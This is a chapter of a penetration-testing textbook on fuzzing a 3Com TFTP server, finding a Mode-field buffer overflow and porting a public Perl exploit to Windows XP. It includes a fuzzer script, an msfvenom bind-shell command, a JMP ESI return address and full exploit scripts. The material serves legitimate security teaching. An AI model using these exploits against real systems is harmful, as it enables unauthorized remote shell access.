<html><head></head><body><section class="chapter" epub:type="chapter" id="fuzzingcomma_porting_exploitscomma_and_m" title="Chapter&#xA0;19.&#xA0;Fuzzing, Porting Exploits, and Metasploit Modules"><div class="titlepage"><div><div><h2 class="title">Chapter 19. Fuzzing, Porting Exploits, and Metasploit Modules</h2></div></div></div><p><a class="indexterm" id="iddle1428"/>In this chapter, we will review a few more basic exploit development techniques. We will look at using a technique called <span class="emphasis"><em>fuzzing</em></span> to find potential exploits in vulnerable programs. We will also cover working with public exploit code and safely porting it to meet our needs, as well the basics of building our own Metasploit modules. Finally, we will discuss some of the exploitation mitigation techniques that our targets may have in place.</p><div class="sect1" title="Fuzzing Programs"><div class="titlepage"><div><div><h2 class="title" id="fuzzing_programs" style="clear: both">Fuzzing Programs</h2></div></div></div><p>In <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>, we exploited War-FTP version 1.65’s Username field buffer overflow with a 1,100-byte exploit string. The natural question is, how did we know that 1,100 <span class="emphasis"><em>A</em></span>s in the Username field would crash the program, and, more importantly, how did security researchers find this vulnerability for <a class="indexterm" id="iddle1146"/><a class="indexterm" id="iddle1188"/><a class="indexterm" id="iddle1430"/><a class="indexterm" id="iddle1431"/><a class="indexterm" id="iddle2255"/>the first time? In some cases, source code for programs is publicly available, so a researcher looking for vulnerabilities need only be well versed in secure coding practices. In other cases, we can use a popular method called <span class="emphasis"><em>fuzzing</em></span> to send various inputs to a program, hoping that something strange will happen.</p><div class="sect2" title="Finding Bugs with Code Review"><div class="titlepage"><div><div><h3 class="title" id="finding_bugs_with_code_review">Finding Bugs with Code Review</h3></div></div></div><p>In <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, we used a short Linux program to illustrate a buffer overflow vulnerability. When auditing the source code of this program (as shown in <a class="xref" href="ch19.xhtml#vulnerable_c_code" title="Example 19-1. Vulnerable C code">Example 19-1</a>), we see the <code class="literal">strcpy</code> function ❶. As discussed in that chapter, this function does no bounds checking and may be a security risk.</p><div class="example"><a id="vulnerable_c_code"/><div class="example-title">Example 19-1. Vulnerable C code</div><div class="example-contents"><pre class="programlisting">#include &lt;string.h&gt;&#13;
#include &lt;stdio.h&gt;&#13;
&#13;
void overflowed() {&#13;
        printf("%s\n", "Execution Hijacked");&#13;
}&#13;
&#13;
void function(char *str){&#13;
        char buffer[5];&#13;
        strcpy(buffer, str); ❶&#13;
}&#13;
void main(int argc, char *argv[])&#13;
{&#13;
        function(argv[1]); ❷&#13;
        printf("%s\n", "Executed normally");&#13;
}</pre></div></div><p>Reading through this source code, we see that user input (the first program argument) is passed to <code class="literal">function</code> ❷. The user input is then copied into a five-character string called <code class="literal">buffer</code> using <code class="literal">strpy</code> ❶. As we saw in <a class="xref" href="ch16.xhtml" title="Chapter 16. A Stack-Based Buffer Overflow in Linux">Chapter 16</a>, we can exploit this behavior to create a stack-based buffer overflow.</p></div><div class="sect2" title="Fuzzing a Trivial FTP Server"><div class="titlepage"><div><div><h3 class="title" id="fuzzing_a_trivial_ftp_server">Fuzzing a Trivial FTP Server</h3></div></div></div><p>When we don’t have access to a program’s source code, we have to use other methods to find potentially exploitable security issues. We can use fuzzing to send various inputs to the program that the developer never intended the code to process. If we can find input that will manipulate memory in a controllable way, we may be able to exploit the program.</p><p>In <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>, when exploiting War-FTP 1.65, we first made the program crash by sending 1,100 <span class="emphasis"><em>A</em></span>s in the Username field. Once we determined that EIP contained four <span class="emphasis"><em>A</em></span>s, as well as a long string of <span class="emphasis"><em>A</em></span>s from the ESP register, we concluded that this issue was exploitable and proceeded to write a working stack-based buffer overflow exploit. In the following example, we start a step earlier and use fuzzing to determine how many <span class="emphasis"><em>A</em></span>s we need to send to a program in order to crash it.</p><p><a class="indexterm" id="iddle1745"/><a class="indexterm" id="iddle1856"/><a class="indexterm" id="iddle2298"/>We can use fuzzing techniques to trigger crashes, which we can use to build exploits. Let’s look at an example of fuzzing a Trivial FTP (TFTP) server to find an exploitable vulnerability. We’ll use the 3Com TFTP server version 2.0.1, which we found on our Windows XP system during post exploitation.</p><p>TFTP runs by default on UDP port 69. Because it is connectionless, we will need to know the syntax for TFTP communication to send UDP packets that the TFTP software will attempt to process. According to TFTP’s Request for Comment (RFC) page, a proper TFTP packet is in the format shown in <a class="xref" href="ch19.xhtml#tftp_packet_format" title="Example 19-2. TFTP packet format">Example 19-2</a>. To get TFTP to respond to us, we need to follow this specification.</p><div class="example"><a id="tftp_packet_format"/><div class="example-title">Example 19-2. TFTP packet format</div><div class="example-contents"><pre class="programlisting">  2 bytes    string    1 byte    string    1 byte&#13;
------------------------------------------------&#13;
| Opcode |  Filename  |   0  |    Mode    |   0  |&#13;
------------------------------------------------</pre></div></div><p>When considering stack-based buffer overflow attacks, look for places where the user controls the size and content of the input. If we can send input that technically meets the TFTP specification but which contains input that the code was not designed to process, we may be able to trigger a stack-based buffer overflow vulnerability. In the case of this TFTP server, the first field, Opcode, is always two bytes long and includes one of the following strings:</p><div class="informaltable"><table style="border-collapse: collapse; border-top: 0.5pt solid ; border-bottom: 0.5pt solid ; border-left: 0.5pt solid ; border-right: 0.5pt solid ; "><colgroup><col class="c1"/><col class="c2"/></colgroup><thead><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>Opcode</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>Operation</p></td></tr></thead><tbody><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>01</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>Read request (RRQ)</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>02</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>Write request (WRQ)</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>03</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>Data (DATA)</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; border-bottom: 0.5pt solid ; "><p>04</p></td><td style="vertical-align: top; border-bottom: 0.5pt solid ; "><p>Acknowledgment (ACK)</p></td></tr><tr><td style="vertical-align: top; border-right: 0.5pt solid ; "><p>05</p></td><td style="vertical-align: top; "><p>Error (ERROR)</p></td></tr></tbody></table></div><p>However, we can control the Filename field. In a real TFTP request, this is where we would tell the server the filename we want to read, write, and so on. The length is variable and the contents of the string are user controlled, so this may be a good place to look for stack-based buffer overflow vulnerabilities. For example, perhaps the author of the code was not expecting anyone to enter a filename that is 1,000 characters long. After all, who would want to type in a 1,000-character filename?</p><p>The next field is a null byte, which signifies the end of the filename. We can’t control this field, but we can control the fourth field, Mode, which is a user-controlled variable string. According to the RFC, TFTP’s supported modes include netascii, octet, and mail. This is an ideal place for us to fuzz, because developers are expecting only eight characters or less for this field. The TFTP packet ends with a null byte to signify the end of the Mode.</p></div><div class="sect2" title="Attempting a Crash"><div class="titlepage"><div><div><h3 class="title" id="attempting_a_crash">Attempting a Crash</h3></div></div></div><p><a class="indexterm" id="iddle1003"/><a class="indexterm" id="iddle1212"/><a class="indexterm" id="iddle1429"/><a class="indexterm" id="iddle2296"/>For our fuzzing exercise, we will craft a succession of legitimate TFTP packets with bogus and increasingly long input in the Mode field. If the TFTP processes the packets correctly, it should say the Mode is unrecognized and stop processing the packet. Perhaps if we can trigger a stack-based buffer overflow vulnerability, the results will be different, and we can cause the program to crash. To do this, we will again write a simple Python program.</p><p>Instead of setting our buffer variable to a string of 1,100 <span class="emphasis"><em>A</em></span>s, as in the War-FTP exploitation examples in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a> and <a class="xref" href="ch18.xhtml" title="Chapter 18. Structured Exception Handler Overwrites">Chapter 18</a>, we’ll create an array of strings of variable length in <a class="xref" href="ch19.xhtml#simple_tftp_fuzzing_program" title="Example 19-3. A simple TFTP fuzzing program">Example 19-3</a>.</p><div class="example"><a id="simple_tftp_fuzzing_program"/><div class="example-title">Example 19-3. A simple TFTP fuzzing program</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/python&#13;
import socket&#13;
bufferarray = ["A"*100] ❶&#13;
addition = 200&#13;
while len(bufferarray) &lt;= 50: ❷&#13;
        bufferarray.append("A"*addition) ❸&#13;
        addition += 100&#13;
for value in bufferarray: ❹&#13;
        tftppacket = "\x00\x02" + "Georgia" + "\x00" + value + "\x00" ❺&#13;
        print "Fuzzing with length " + str(len(value))&#13;
        s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM) ❻&#13;
        s.sendto(tftppacket,('192.168.20.10',69))&#13;
        response = s.recvfrom(2048)&#13;
        print response</pre></div></div><p>The first entry in the array will be a string of 100 <span class="emphasis"><em>A</em></span>s ❶. But before we send any packets to the TFTP server, let’s create the rest of the fuzzing strings and append them to our array by adding new fuzzing strings in increments of 100. Using a <code class="literal">while</code> loop, we will append progressively longer strings to the array until it is 50 elements long ❷. Each time we cycle through the <code class="literal">while</code> loop, a new element will be appended to the array ❸. After we have created our fuzzing strings and the <code class="literal">while</code> loop exits, we will enter a <code class="literal">for</code> loop ❹, which will grab each element of the array in turn and send it within the Mode field of a legitimate TFTP packet ❺.</p><p>Our packet meets the specifications from the TFTP RFC. We have used the mode <code class="literal">02</code> (write request) and the filename <span class="emphasis"><em>Georgia</em></span>. Our string of <span class="emphasis"><em>A</em></span>s from the array are put into the Mode field. Hopefully, one of our increasingly long strings will cause a crash.</p><p>Setting up our network socket is a little different from what we learned in the previous chapter when attacking FTP in Python. Because TFTP is a UDP protocol, we need to set up a UDP socket as opposed to a TCP socket, so the syntax is slightly different ❻. Save the Python code as <span class="emphasis"><em>tftpfuzzer</em></span>, and make it executable.</p><p>Before we start sending fuzzing packets, switch back to your Windows XP machine and attach to the <span class="emphasis"><em>3CTftpSvc</em></span> process with Immunity Debugger, as shown in <a class="xref" href="ch19.xhtml#attaching_immunity_debugger_to_the_3com" title="Figure 19-1. Attaching Immunity Debugger to the 3Com TFTP server">Figure 19-1</a>. This will allow us to view the contents of memory if we cause a crash to verify whether we have gained control of EIP. (Don’t forget to tell the program to continue running by clicking the play button at the top of the Immunity Debugger window.)</p><div class="figure"><a id="attaching_immunity_debugger_to_the_3com"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00195"/><img alt="Attaching Immunity Debugger to the 3Com TFTP server" src="httpatomoreillycomsourcenostarchimages2030580.png.jpg"/></div></div><div class="figure-title">Figure 19-1. Attaching Immunity Debugger to the 3Com TFTP server</div></div><p>Now, in <a class="xref" href="ch19.xhtml#fuzzing_3com_tftp" title="Example 19-4. Fuzzing 3Com TFTP">Example 19-4</a>, we run the TFTP fuzzer program we created in <a class="xref" href="ch19.xhtml#simple_tftp_fuzzing_program" title="Example 19-3. A simple TFTP fuzzing program">Example 19-3</a>.</p><div class="example"><a id="fuzzing_3com_tftp"/><div class="example-title">Example 19-4. Fuzzing 3Com TFTP</div><div class="example-contents"><pre class="programlisting">root@kali:~# <span class="strong"><strong>./tftpfuzzer</strong></span>&#13;
Fuzzing with length100&#13;
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00',❶ ('192.168.20.10', 4484))&#13;
Fuzzing with length 200&#13;
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00', ('192.168.20.10', 4485))&#13;
Fuzzing with length 300&#13;
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00', ('192.168.20.10', 4486))&#13;
Fuzzing with length 400&#13;
('\x00\x05\x00\x04Unknown or unsupported transfer mode : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#13;
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00', ('192.168.20.10', 4487))&#13;
Fuzzing with length 500&#13;
('\x00\x05\x00\x04Unk\x00', ('192.168.20.10', 4488))&#13;
Fuzzing with length 600 ❷</pre></div></div><p>As the program runs through the successive strings of <span class="emphasis"><em>A</em></span>s in the Mode field, the TFTP server replies that it doesn’t know that transport mode ❶. When the fuzzing program attempts to fuzz with a length of 600, it receives no response from the TFTP server ❷, which leads us to believe that a transport mode of 500 <span class="emphasis"><em>A</em></span>s crashed the server, such that it could not respond to us when we sent over 600 <span class="emphasis"><em>A</em></span>s.</p><p>Looking back at the 3Com TFTP server in Immunity Debugger (<a class="xref" href="ch19.xhtml#threecom_tftp_has_crasheddot" title="Figure 19-2. 3Com TFTP has crashed.">Figure 19-2</a>), we see that it has crashed with <code class="literal">41414141</code> in EIP. Also note the short string of <span class="emphasis"><em>A</em></span>s in the register ESP and the much longer string of <span class="emphasis"><em>A</em></span>s in the register ESI. It seems that by sending over a string of 500 characters in the Mode field, we can control execution and the contents of some memory registers: an ideal situation for writing a stack-based buffer overflow exploit.</p><div class="figure"><a id="threecom_tftp_has_crasheddot"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00196"/><img alt="3Com TFTP has crashed." src="httpatomoreillycomsourcenostarchimages2030582.png.jpg"/></div></div><div class="figure-title">Figure 19-2. 3Com TFTP has crashed.</div></div><p>Using the techniques learned in the previous chapter when exploiting War-FTP, see if you can develop a working exploit for the 3Com TFTP 2.0.1 without help from the text. In this case, the saved return pointer overwrite is at the end of the exploit string, and the shellcode in ESI will be earlier in the exploit string. (You’ll find a completed Python exploit for this exercise in <a class="xref" href="ch19.xhtml#writing_metasploit_modules" title="Writing Metasploit Modules">Writing Metasploit Modules</a>. Refer to that code if you get stuck.)</p><p>To restart 3Com TFTP after a crash, browse to <span class="emphasis"><em>C:\Windows</em></span>, open 3CTftpSvcCtrl, and click <span class="strong"><strong>Start Service</strong></span>, as shown in <a class="xref" href="ch19.xhtml#threecom_tftp_service_control_dialog" title="Figure 19-3. 3Com TFTP Service Control dialog">Figure 19-3</a>. Then reattach to the new process in Immunity Debugger.</p><div class="figure"><a id="threecom_tftp_service_control_dialog"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00197"/><img alt="3Com TFTP Service Control dialog" src="httpatomoreillycomsourcenostarchimages2030584.png.jpg"/></div></div><div class="figure-title">Figure 19-3. 3Com TFTP Service Control dialog</div></div></div></div><div class="sect1" title="Porting Public Exploits to Meet Your Needs"><div class="titlepage"><div><div><h2 class="title" id="porting_public_exploits_to_meet_your_nee" style="clear: both">Porting Public Exploits to Meet Your Needs</h2></div></div></div><p><a class="indexterm" id="iddle1002"/><a class="indexterm" id="iddle1360"/><a class="indexterm" id="iddle1378"/><a class="indexterm" id="iddle1960"/><a class="indexterm" id="iddle2012"/><a class="indexterm" id="iddle2122"/>Sometimes you may find an exploitable vulnerability on your pentest, but there is no Metasploit module available to exploit it. While the Metasploit team and contributing module writers from the community do an excellent job of keeping Metasploit up-to-date with current threats, not every known exploit on the Internet has been ported to the framework.</p><p>We can attempt to develop a working exploit by downloading the target software and developing a working exploit, but that approach is not always feasible. The software in question may come with a license fee so expensive that you would end up losing money on the pentest, or it may not be available from the vendor or elsewhere. In addition, your pentest may have a limited time frame, and so you would be better off looking for additional vulnerabilities in the environment rather than spending significant time on custom-exploit development.</p><p>One way to develop your own working exploits is to use publicly available exploits as a base and port them to your environment. Even if a vulnerability lacks a corresponding Metasploit module, you may be able to find proof-of-concept exploit code on a website like Exploit Database (<span class="emphasis"><em><a class="ulink" href="http://www.exploit-db.com/" target="_top">http://www.exploit-db.com/</a></em></span>) or SecurityFocus (<span class="emphasis"><em><a class="ulink" href="http://www.securityfocus.com/" target="_top">http://www.securityfocus.com/</a></em></span>). Although public exploit code should always be used with caution (not everything online does what it says it does), with some due diligence, we can use public exploit code safely.</p><p>Let’s start with a public exploit for the 3Com TFTP 2.0.1 long transport mode vulnerability from Exploit Database, found online at <span class="emphasis"><em><a class="ulink" href="http://www.exploit-db.com/exploits/3388/" target="_top">http://www.exploit-db.com/exploits/3388/</a></em></span> and shown in <a class="xref" href="ch19.xhtml#public_exploit_for_3com_tftp" title="Example 19-5. Public exploit for 3Com TFTP">Example 19-5</a>.</p><div class="example"><a id="public_exploit_for_3com_tftp"/><div class="example-title">Example 19-5. Public exploit for 3Com TFTP</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/perl –w ❶&#13;
#===============================================================&#13;
#                3Com TFTP Service &lt;= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit&#13;
#                               By Umesh Wanve (umesh_345@yahoo.com)&#13;
#===============================================================&#13;
# Credits : Liu Qixu is credited with the discovery of this vulnerability.&#13;
# Reference : http://www.securityfocus.com/bid/21301&#13;
# Date : 27-02-2007&#13;
# Tested on Windows 2000 SP4 Server English ❷&#13;
#           Windows 2000 SP4 Professional English&#13;
# You can replace shellcode with your favourite one :&#13;
# Buffer overflow exists in transporting mode name of TFTP server.&#13;
# So here you go.&#13;
# Buffer = "\x00\x02"      +  "filename"    +  "\x00" +  nop sled +  Shellcode + JUMP  + "\x00";&#13;
# This was written for educational purpose. Use it at your own risk. Author will not be&#13;
# responsible for any damage.&#13;
#===============================================================&#13;
use IO::Socket;&#13;
if(!($ARGV[1]))&#13;
{&#13;
 print "\n3COM Tftp long transport name exploit\n";&#13;
 print "\tCoded by Umesh wanve\n\n";&#13;
 print "Use: 3com_tftp.pl &lt;host&gt; &lt;port&gt;\n\n";&#13;
 exit;&#13;
}&#13;
$target = IO::Socket::INET-&gt;new(Proto=&gt;'udp',&#13;
                                PeerAddr=&gt;$ARGV[0],&#13;
                                PeerPort=&gt;$ARGV[1])&#13;
                            or die "Cannot connect to $ARGV[0] on port $ARGV[1]";&#13;
# win32_bind -  EXITFUNC=seh LPORT=4444 Size=344 Encoder=PexFnstenvSub http://metasploit.com&#13;
my($shellcode)= ❸&#13;
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x48".&#13;
"\xc8\xb3\x54\x83\xeb\xfc\xe2\xf4\xb4\xa2\x58\x19\xa0\x31\x4c\xab".&#13;
"\xb7\xa8\x38\x38\x6c\xec\x38\x11\x74\x43\xcf\x51\x30\xc9\x5c\xdf".&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
"\xc3\x9f\x4f\xd7\x8c\xac\x4c\x82\x1a\x37\x63\x3c\xb8\x42\xb7\x0b".&#13;
"\x1b\x37\x65\xab\x98\xc8\xb3\x54";&#13;
print "++ Building Malicious Packet .....\n";&#13;
$nop="\x90" x 129;&#13;
$jmp_2000 = "\x0e\x08\xe5\x77";❹# jmp esi user32.dll windows 2000 sp4 english&#13;
$exploit = "\x00\x02";❺                        #write request (header)&#13;
$exploit=$exploit."A";                          #file name&#13;
$exploit=$exploit."\x00";                       #Start of transporting name&#13;
$exploit=$exploit.$nop;❻                      #nop sled to land into shellcode&#13;
$exploit=$exploit.$shellcode;❼                 #our Hell code&#13;
$exploit=$exploit.$jmp_2000;❽                  #jump to shellcode&#13;
$exploit=$exploit."\x00";                       #end of TS mode name&#13;
print $target $exploit;                         #Attack on victim&#13;
print "++ Exploit packet sent ...\n";&#13;
print "++ Done.\n";&#13;
print "++ Telnet to 4444 on victim's machine ....\n";&#13;
sleep(2);&#13;
close($target);&#13;
exit;&#13;
#----------------------------------------------------------------------------------&#13;
# milw0rm.com [2007-02-28]</pre></div></div><p><a class="indexterm" id="iddle1775"/><a class="indexterm" id="iddle1847"/><a class="indexterm" id="iddle2143"/><a class="indexterm" id="iddle1409"/><a class="indexterm" id="iddle1578"/><a class="indexterm" id="iddle2068"/><a class="indexterm" id="iddle2345"/>This exploit is written in Perl ❶. To use public exploits, you will need basic reading knowledge in a number of languages. Additionally, this exploit targets Windows 2000 SP4 ❷, whereas our target is Windows XP SP3. We will need to make some changes to port this exploit to our platform.</p><p>The shellcode included with this exploit claims to have been generated using Metasploit and to open a bind shell on port 4444 ❸.</p><div class="note" title="Note"><h3 class="title"><a id="ch19note01"/>Note</h3><p>No offense intended to the original author of this exploit, but in a public exploit, always be wary of anything you can’t read. Additionally, be aware that the included shellcode may not work for your environment. For example, it may be a reverse shell headed to a static IP address and port. Therefore, it is good practice to use Msfvenom to generate new, trustworthy shellcode before running any public exploit.</p></div><p>Reading through the exploit, we see that the author creates a TFTP packet similar to the one we created in our fuzzing example earlier in the chapter ❺. The Mode field is filled with a NOP sled of 129 characters ❻, 344 bytes of shellcode ❼, and the four-byte return address ❽ (in this case, a <code class="literal">JMP</code> <code class="literal">ESI</code> instruction) to redirect execution to the attacker-controlled ESI register ❹.</p><div class="note" title="Note"><h3 class="title"><a id="ch19note02"/>Note</h3><p>A <span class="emphasis"><em>NOP sled</em></span> is a series of no operating instructions (\x90 in hex) that do nothing and move on. They are typically used to pad exploits. Exploit developers can just redirect execution to somewhere in the NOP sled, and execution will just “slide” down the NOP sled, doing nothing, until it reaches the shellcode. However, we have learned that we can be more precise with our exploits, and we usually don’t need NOP sleds at all.</p></div><p>The command for the variable <code class="literal">$jmp_2000</code> ❹ tells us that the exploit uses a <code class="literal">JMP ESI</code> instruction in <span class="emphasis"><em>USER32.dll</em></span> on Windows 2000 SP4 English.</p><div class="sect2" title="Finding a Return Address"><div class="titlepage"><div><div><h3 class="title" id="finding_a_return_address">Finding a Return Address</h3></div></div></div><p>Because we are using a different platform, the memory location (<code class="literal">0x77E5080E</code>) of this <code class="literal">JMP ESI</code> instruction may be different. <span class="emphasis"><em>USER32.dll</em></span> is a component of the Windows operating system. Windows XP does not use ASLR, discussed later in this chapter, so <span class="emphasis"><em>USER32.dll</em></span> is loaded into the same memory location on all Windows XP SP3 English platforms.</p><p>We have taken advantage of static DLL locations in our previous exploit exercises. We need not have a copy of 3Com TFTP running to find the memory locations of instructions in Windows components. For example, as shown in <a class="xref" href="ch19.xhtml#finding_jmp_esi_instructions_in_user32do" title="Figure 19-4. Finding JMP ESI instructions in USER32.dll">Figure 19-4</a>, from debugging War-FTP, we can search for a <code class="literal">JMP ESI</code> instruction in <span class="emphasis"><em>USER32.dll</em></span>. (It is a good idea to stick with the DLL noted in the original exploit if we don’t have a copy of the program. We can’t be sure the program loads <span class="emphasis"><em>MSVCRT.dll</em></span>, for example.)</p><p>Of course, in our case, we have 3Com TFTP locally, but if we didn’t have access to the app, we could use Mona to look for <code class="literal">JMP</code> instructions inside a specific module. For example, we could look for instances of <code class="literal">JMP ESI</code> (or the equivalent) with the command <code class="literal">!mona jmp -r esi -m user32</code>, as shown in <a class="xref" href="ch19.xhtml#finding_jmp_esi_instructions_in_user32do" title="Figure 19-4. Finding JMP ESI instructions in USER32.dll">Figure 19-4</a>.</p><div class="figure"><a id="finding_jmp_esi_instructions_in_user32do"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00198"/><img alt="Finding JMP ESI instructions in USER32.dll" src="httpatomoreillycomsourcenostarchimages2030586.png.jpg"/></div></div><div class="figure-title">Figure 19-4. Finding <code class="literal">JMP ESI</code> instructions in <span class="emphasis"><em>USER32.dll</em></span></div></div><p><a class="indexterm" id="iddle1379"/><a class="indexterm" id="iddle2144"/>And we find a <code class="literal">JMP ESI</code> instruction at the memory address <code class="literal">7E45AE4E</code> in <span class="emphasis"><em>USER32.dll</em></span> on Windows XP SP3. If we change the <code class="literal">jmp_2000</code> variable to this value in little-endian format, this exploit should work for our platform.</p><a id="pro_id00213"/><pre class="programlisting">$<span class="strong"><strong>jmp_2000 = "\x4E\xAE\x45\x7E";</strong></span></pre></div><div class="sect2" title="Replacing Shellcode"><div class="titlepage"><div><div><h3 class="title" id="replacing_shellcode">Replacing Shellcode</h3></div></div></div><p>As noted earlier, we also need to replace the shellcode with code generated by Msfvenom. We can use a bind shell or any Windows payload that will fit in 344 + 129 bytes (the included shellcode plus the NOP sled). The only bad character we need to avoid this time is the null byte. Tell Msfvenom to output the payload in Perl format so we can easily add it to our exploit.</p><a id="pro_id00214"/><pre class="programlisting">root@kali:~# <span class="strong"><strong>msfvenom -p windows/shell_bind_tcp -b '\x00' -s 473 -f perl</strong></span></pre></div><div class="sect2" title="Editing the Exploit"><div class="titlepage"><div><div><h3 class="title" id="editing_the_exploit">Editing the Exploit</h3></div></div></div><p>Our generated shellcode from Msfvenom is 368 bytes, whereas the original shellcode in the public exploit was 344 bytes. Now make the changes to the original exploit code shown in <a class="xref" href="ch19.xhtml#ported_exploit" title="Example 19-6. The ported exploit">Example 19-6</a>. We delete the NOP sled and pad our exploit string with 105 bytes after the shellcode, so our return address still ends up hijacking EIP.</p><div class="example"><a id="ported_exploit"/><div class="example-title">Example 19-6. The ported exploit</div><div class="example-contents"><pre class="programlisting">#!/usr/bin/perl -w&#13;
#===============================================================&#13;
#                3Com TFTP Service &lt;= 2.0.1 (Long Transporting Mode) Overflow Perl Exploit&#13;
#                               By Umesh Wanve (umesh_345@yahoo.com)&#13;
#===============================================================&#13;
# Credits : Liu Qixu is credited with the discovery of this vulnerability.&#13;
# Reference : http://www.securityfocus.com/bid/21301&#13;
# Date : 27-02-2007&#13;
# Tested on Windows XP SP3&#13;
# You can replace shellcode with your favourite one :&#13;
# Buffer overflow exists in transporting mode name of TFTP server.&#13;
# So here you go.&#13;
# Buffer = "\x00\x02"      +  "filename"    +  "\x00" +  nop sled +  Shellcode + JUMP  + "\x00";&#13;
# This was written for educational purpose. Use it at your own risk. Author will not be responsible for any damage.&#13;
#===============================================================&#13;
use IO::Socket;&#13;
if(!($ARGV[1]))&#13;
{&#13;
 print "\n3COM Tftp long transport name exploit\n";&#13;
 print "\tCoded by Umesh wanve\n\n";&#13;
 print "Use: 3com_tftp.pl &lt;host&gt; &lt;port&gt;\n\n";&#13;
 exit;&#13;
}&#13;
$target = IO::Socket::INET-&gt;new(Proto=&gt;'udp',&#13;
                                PeerAddr=&gt;$ARGV[0],&#13;
                                PeerPort=&gt;$ARGV[1])&#13;
                            or die "Cannot connect to $ARGV[0] on port $ARGV[1]";&#13;
my($shellcode) = ❶&#13;
"\xda\xc5\xd9\x74\x24\xf4\x5f\xb8\xd4\x9d\x5d\x7a\x29\xc9" .&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
"\x27\x92\x07\x7e";&#13;
print "++ Building Malicious Packet .....\n";&#13;
$padding="A" x 105; ❷&#13;
$jmp_xp = "\x4E\xAE\x45\x7E";❸# jmp esi user32.dll windows xp sp3 english&#13;
$exploit = "\x00\x02";                        #write request (header)&#13;
$exploit=$exploit."A";                        #file name&#13;
$exploit=$exploit."\x00";                     #Start of transporting name&#13;
$exploit=$exploit.$shellcode;                 #shellcode&#13;
$exploit=$exploit.$padding;                   #padding&#13;
$exploit=$exploit.$jmp_xp;                    #jump to shellcode&#13;
$exploit=$exploit."\x00";                     #end of TS mode name&#13;
print $target $exploit;                       #Attack on victim&#13;
print "++ Exploit packet sent ...\n";&#13;
print "++ Done.\n";&#13;
print "++ Telnet to 4444 on victim's machine ....\n";&#13;
sleep(2);&#13;
close($target);&#13;
exit;&#13;
#----------------------------------------------------------------------------------------------&#13;
